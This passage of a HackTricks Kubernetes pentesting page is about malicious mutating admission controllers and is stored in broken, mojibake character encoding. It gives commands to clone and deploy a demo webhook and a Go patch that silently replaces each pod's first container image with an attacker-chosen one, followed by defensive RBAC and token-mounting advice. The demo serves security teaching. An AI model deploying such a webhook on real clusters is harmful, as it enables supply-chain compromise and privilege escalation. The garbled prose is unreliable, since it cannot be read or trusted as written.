å‡†å…¥æ§åˆ¶å™¨æ˜¯ä¸€æ®µä»£ç ï¼Œå®ƒåœ¨å¯¹è±¡æŒä¹…åŒ–ä¹‹å‰ï¼Œä½†åœ¨è¯·æ±‚ç»è¿‡èº«ä»½éªŒè¯å’Œæˆæƒä¹‹åï¼Œæ‹¦æˆªå¯¹Kubernetes APIæœåŠ¡å™¨çš„è¯·æ±‚ã€‚

å¦‚æœæ”»å‡»è€…æˆåŠŸæ³¨å…¥ä¸€ä¸ªå˜å¼‚å‡†å…¥æ§åˆ¶å™¨ï¼Œä»–å°†èƒ½å¤Ÿä¿®æ”¹å·²ç»ç»è¿‡èº«ä»½éªŒè¯çš„è¯·æ±‚ã€‚è¿™å¯èƒ½å¯¼è‡´ç‰¹æƒå‡çº§ï¼Œå¹¶ä¸”é€šå¸¸ä¼šåœ¨é›†ç¾¤ä¸­æŒä¹…å­˜åœ¨ã€‚

ç¤ºä¾‹æ¥è‡ª[https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)ï¼š
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
ç­‰å¾… Webhook æœåŠ¡å™¨å‡†å¤‡å°±ç»ªã€‚æ£€æŸ¥çŠ¶æ€ï¼š
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

ä¸€æ—¦æˆ‘ä»¬çš„æ¶æ„å˜å¼‚ Webhook è¿è¡Œèµ·æ¥ï¼Œè®©æˆ‘ä»¬éƒ¨ç½²ä¸€ä¸ªæ–°çš„ Podã€‚
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œç›´åˆ°æ‚¨çœ‹åˆ°PodçŠ¶æ€å‘ç”Ÿå˜åŒ–ã€‚ç°åœ¨ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°`ErrImagePull`é”™è¯¯ã€‚ä½¿ç”¨ä»¥ä¸‹ä»»ä¸€æŸ¥è¯¢æ£€æŸ¥å›¾åƒåç§°ã€‚
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬å°è¯•è¿è¡Œé•œåƒ `nginx`ï¼Œä½†æœ€ç»ˆæ‰§è¡Œçš„é•œåƒæ˜¯ `rewanthtammana/malicious-image`ã€‚åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆï¼ï¼ï¼Ÿ

#### æŠ€æœ¯ç»†èŠ‚ <a href="#heading-technicalities" id="heading-technicalities"></a>

æˆ‘ä»¬å°†æ­ç¤ºåˆšåˆšå‘ç”Ÿçš„äº‹æƒ…ã€‚æ‚¨æ‰§è¡Œçš„ `./deploy.sh` è„šæœ¬åˆ›å»ºäº†ä¸€ä¸ªå˜å¼‚çš„ Webhook å‡†å…¥æ§åˆ¶å™¨ã€‚ä¸‹é¢çš„ä»£ç ç‰‡æ®µæ˜¯å˜å¼‚çš„ Webhook å‡†å…¥æ§åˆ¶å™¨è´Ÿè´£ä¸Šè¿°ç»“æœçš„åŸå› ã€‚
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
ä»¥ä¸Šä»£ç æ®µå°†æ¯ä¸ªPodä¸­çš„ç¬¬ä¸€ä¸ªå®¹å™¨é•œåƒæ›¿æ¢ä¸º`rewanthtammana/malicious-image`ã€‚

## æœ€ä½³å®è·µ

### **é˜²æ­¢Podä¸Šçš„æœåŠ¡è´¦æˆ·ä»¤ç‰Œè‡ªåŠ¨æŒ‚è½½**

åœ¨åˆ›å»ºPodæ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨æŒ‚è½½ä¸€ä¸ªæœåŠ¡è´¦æˆ·ï¼ˆé»˜è®¤ä¸ºåŒä¸€å‘½åç©ºé—´ä¸­çš„é»˜è®¤æœåŠ¡è´¦æˆ·ï¼‰ã€‚å¹¶éæ¯ä¸ªPodéƒ½éœ€è¦åœ¨å…¶å†…éƒ¨ä½¿ç”¨APIã€‚

ä»1.6+ç‰ˆæœ¬å¼€å§‹ï¼Œå¯ä»¥ä½¿ç”¨`automountServiceAccountToken: false`æ¥é˜²æ­¢Podä¸Šçš„æœåŠ¡è´¦æˆ·ä»¤ç‰Œè‡ªåŠ¨æŒ‚è½½ã€‚å®ƒå¯ä»¥ç”¨äºæœåŠ¡è´¦æˆ·æˆ–Podã€‚

åœ¨æœåŠ¡è´¦æˆ·ä¸Šæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/serviceAccount\_with\_autoamountServiceAccountToken\_false.png)

ä¹Ÿå¯ä»¥åœ¨Podä¸Šä½¿ç”¨ï¼š\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/pod\_with\_autoamountServiceAccountToken\_false.png)

### **æˆäºˆç‰¹å®šç”¨æˆ·RoleBindings\ClusterRoleBindings**

åœ¨åˆ›å»ºRoleBindings\ClusterRoleBindingsæ—¶ï¼Œè¯·ç¡®ä¿åªæœ‰éœ€è¦è¯¥ç»‘å®šä¸­è§’è‰²çš„ç”¨æˆ·åœ¨å†…ã€‚å¾ˆå®¹æ˜“å¿˜è®°ä¸å†ç›¸å…³çš„ç”¨æˆ·åœ¨è¿™äº›ç»„ä¸­ã€‚

### **ä½¿ç”¨Roleså’ŒRoleBindingsè€Œä¸æ˜¯ClusterRoleså’ŒClusterRoleBindings**

ä½¿ç”¨ClusterRoleså’ŒClusterRoleBindingsæ—¶ï¼Œå®ƒé€‚ç”¨äºæ•´ä¸ªé›†ç¾¤ã€‚æ­¤ç±»ç»„ä¸­çš„ç”¨æˆ·åœ¨æ‰€æœ‰å‘½åç©ºé—´ä¸Šéƒ½å…·æœ‰æƒé™ï¼Œè¿™æœ‰æ—¶æ˜¯ä¸å¿…è¦çš„ã€‚Roleså’ŒRoleBindingså¯ä»¥åº”ç”¨äºç‰¹å®šçš„å‘½åç©ºé—´ï¼Œå¹¶æä¾›å¦ä¸€å±‚å®‰å…¨æ€§ã€‚

### **ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **å‚è€ƒèµ„æ–™**

{% embed url="https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions" %}

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1" %}

***

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
